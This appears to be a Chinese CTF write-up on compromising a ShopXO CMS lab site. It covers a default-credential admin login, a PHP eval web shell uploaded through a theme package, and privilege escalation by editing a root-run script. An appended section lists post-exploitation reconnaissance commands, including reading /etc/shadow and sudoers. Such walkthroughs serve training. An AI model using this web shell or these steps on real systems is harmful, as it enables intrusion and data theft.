> 一日三餐没烦恼，今天到超市买个老八小汉堡儿。既实惠，还管饱，你看这超市整滴行不行。


首先开启题目环境，进去是一个完整搭建的网站，在页面上查找有用信息，很快可以判断出是由`ShopXO CMS`搭建的

无奈本人才疏学浅(疏？浅？无！)，只好请出度娘老师，通过度娘老师知道了默认后台地址以及账号密码：/admin.php | admin:shopxo  
拿去碰碰运气，意外的成功进入后台

没想到这后台功能还挺多的，还是来找找我最擅长(简单)的主题插马吧，左侧找到安装主题功能，然后到shopxo官网下载一个官方的主题模板，摸了一下主题模板的结构后发现可以把马插在压缩包的`/主题名/_static_`

顺带说一下这种后台getshell最好用一句话

```php
<?php @eval($_POST[ysneko]);?>
```

成功上传后的路径是[http://localhost/public/static/static/index/主题名/ysneko.php](http://localhost/public/static/static/index/%E4%B8%BB%E9%A2%98%E5%90%8D/ysneko.php)[](https://s1.ax1x.com/2020/05/28/teBJH0.png)[](https://s1.ax1x.com/2020/05/28/teBJH0.png)


没有报404，上传成功，接下来用蚁剑连接[](https://s1.ax1x.com/2020/05/28/teD1PO.png)[](https://s1.ax1x.com/2020/05/28/teD1PO.png)

[![](https://i-blog.csdnimg.cn/blog_migrate/1df33998e67c0db6a5490ef978fc3097.png)](https://s1.ax1x.com/2020/05/28/teD1PO.png)

成功连接，然后兴高采烈的去找flag，结果找到一个错误的flag，提示我们这是一个假flag，真flag在/root

但是我们并没有root权限[](https://s1.ax1x.com/2020/05/28/terx7q.png)[](https://s1.ax1x.com/2020/05/28/terx7q.png)

[![](https://i-blog.csdnimg.cn/blog_migrate/8ebf9c491f43d23b884650da2288354d.png)](https://s1.ax1x.com/2020/05/28/terx7q.png)

我们可以看到当前是www-data用户，这是一个标准的低权限用户，并没有root权限[](https://s1.ax1x.com/2020/05/28/teDszQ.png)[](https://s1.ax1x.com/2020/05/28/teDszQ.png)

[![](https://i-blog.csdnimg.cn/blog_migrate/4c0e41674d0a16f70ef825332c8dc758.png)](https://s1.ax1x.com/2020/05/28/teDszQ.png)

无奈只能想办法提权，但是转眼一看内核版本，我绝望了[](https://s1.ax1x.com/2020/05/28/tesruj.png)[](https://s1.ax1x.com/2020/05/28/tesruj.png)

[![](https://i-blog.csdnimg.cn/blog_migrate/82c6b92cf9f2b0ec4255e779bdbffafc.png)](https://s1.ax1x.com/2020/05/28/tesruj.png)

这个版本基本不可能提权，所以只能到处找找线索，经过好一通翻找，在根目录发现了一个权限为0755的sh脚本，从文件名来看应该是某种自动脚本[](https://s1.ax1x.com/2020/05/28/teoJSA.png)[](https://s1.ax1x.com/2020/05/28/teoJSA.png)

[![](https://i-blog.csdnimg.cn/blog_migrate/79e18a38143ecde32fa8185d8963fec8.png)](https://s1.ax1x.com/2020/05/28/teoJSA.png)

内容如下：

```bash
#!/bin/shwhile true; do (python /var/mail/makeflaghint.py &) && sleep 60; done
```

这段脚本的意思是每60秒执行一次中间的python脚本，我们再来看下中间调用的makeflaghint.py

```python
import osimport ioimport timeos.system("whoami")gk1=str(time.ctime())gk="\nGet The RooT,The Date Is Useful!"f=io.open("/flag.hint", "rb+")f.write(str(gk1))f.write(str(gk))f.close()
```

这段脚本的作用大致是调用某些参数生成/flag.hint文件，所以最终auto.sh的效果是每隔60秒调用makeflaghint.py生成一个flag.hint[](https://s1.ax1x.com/2020/05/28/te7Q8H.png)[](https://s1.ax1x.com/2020/05/28/te7Q8H.png)

[![](https://i-blog.csdnimg.cn/blog_migrate/2a7d5841ebd6996b96907254f9d430ea.png)](https://s1.ax1x.com/2020/05/28/te7Q8H.png)

随着两次刷新，flag.hint更新了，表明auto.sh确实是在后台以root权限执行，那么我们只需要修改makeflaghint.py的内容来获取/root中的flag即可

```lua
flag=io.open("/root/flag","r").read()f.write(str(flag))
```

[](https://s1.ax1x.com/2020/05/28/teqcZt.png)[](https://s1.ax1x.com/2020/05/28/teqcZt.png)

[![](https://i-blog.csdnimg.cn/blog_migrate/c6267639df75b0f9e99901a08a5a31bb.png)](https://s1.ax1x.com/2020/05/28/teqcZt.png)

[](https://s1.ax1x.com/2020/05/28/teqwGD.png)[

![](https://i-blog.csdnimg.cn/blog_migrate/ddd934ce0f0d422b302ac901b28c3a4b.png)

](https://s1.ax1x.com/2020/05/28/teqwGD.png)

最终flag为：

```cobol
flag{6ec752c9-361e-41a8-905a-f7854c7d0654}
```




----





          
在使用蚁剑连接到目标主机后，你可以通过以下命令来获取系统信息、用户权限和可操作范围：

## 系统信息获取命令

### 1. 基本系统信息
```bash
# 查看系统信息
uname -a

# 查看操作系统版本
cat /etc/os-release

# 查看内核版本
uname -r

# 查看主机名
hostname

# 查看当前时间
date
```

### 2. 用户和权限信息
```bash
# 查看当前用户
whoami

# 查看当前用户ID和组信息
id

# 查看系统所有用户
cat /etc/passwd

# 查看系统所有组
cat /etc/group

# 查看sudo权限用户
cat /etc/sudoers

# 查看当前登录用户
who

# 查看最近登录用户
last
```

### 3. 网络信息
```bash
# 查看网络接口信息
ifconfig

# 查看IP地址（较新系统）
ip addr

# 查看路由表
route -n

# 查看网络连接
netstat -an

# 查看监听端口
netstat -tuln

# 查看DNS配置
cat /etc/resolv.conf
```

### 4. 进程和系统状态
```bash
# 查看运行进程
ps aux

# 查看系统负载
top

# 查看磁盘使用情况
df -h

# 查看内存使用情况
free -m

# 查看系统启动时间
uptime
```

### 5. 文件和目录权限
```bash
# 查看当前目录文件（详细信息）
ls -al

# 查看指定目录权限
ls -ld /path/to/directory

# 查看可写目录
find / -type d -writable 2>/dev/null

# 查看可读文件
find / -type f -readable 2>/dev/null

# 查看SUID文件
find / -perm -4000 2>/dev/null
```

## 权限检查和操作范围

### 1. 权限提升检查
```bash
# 检查sudo权限
sudo -l

# 检查是否有root权限
id root

# 检查crontab
crontab -l

# 查看系统定时任务
ls -la /etc/cron*
```

### 2. 敏感文件检查
```bash
# 查看shadow文件（需要root权限）
cat /etc/shadow

# 查看系统日志
ls -la /var/log/

# 查看SSH配置
cat /etc/ssh/sshd_config

# 查看系统配置文件
ls -la /etc/
```

### 3. 环境变量和路径
```bash
# 查看环境变量
env

# 查看PATH变量
echo $PATH

# 查看当前目录
pwd

# 查看历史命令
history
```

## 常见限制和不能操作的情况

### 1. 权限受限情况
- 普通用户无法读取/etc/shadow等敏感文件
- 没有sudo权限无法执行管理员命令
- 受限shell环境可能限制某些命令执行

### 2. 安全机制限制
- SELinux/AppArmor可能限制文件访问
- chroot环境限制文件系统访问范围
- 容器环境限制系统级操作

### 3. 常见检查命令
```bash
# 检查SELinux状态
sestatus

# 检查AppArmor状态
aa-status

# 检查是否在容器中
cat /proc/1/cgroup

# 检查系统限制
ulimit -a
```

这些命令可以帮助你全面了解当前系统的状态、你的权限级别以及可以执行的操作范围。在实际使用中，请根据具体情况选择合适的命令执行。
        